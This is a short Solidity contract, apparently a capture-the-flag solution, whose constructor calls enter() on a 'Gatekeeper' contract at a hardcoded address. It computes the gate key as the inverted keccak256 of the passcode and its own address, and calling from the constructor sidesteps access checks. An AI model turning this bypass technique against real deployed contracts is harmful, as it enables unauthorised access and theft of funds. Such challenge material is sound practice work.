// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.4.19;

interface IGatekeeper {
  function enter (bytes32 passcode, bytes8 gateKey) external;
}

contract Contract {
  function Contract (
    bytes32 passcode
  ) public {
    IGatekeeper(0xbB902569a997D657e8D10B82Ce0ec5A5983C8c7C).enter(
      passcode,
      bytes8(uint64(~keccak256(passcode, address(this))))
    );
  }
}
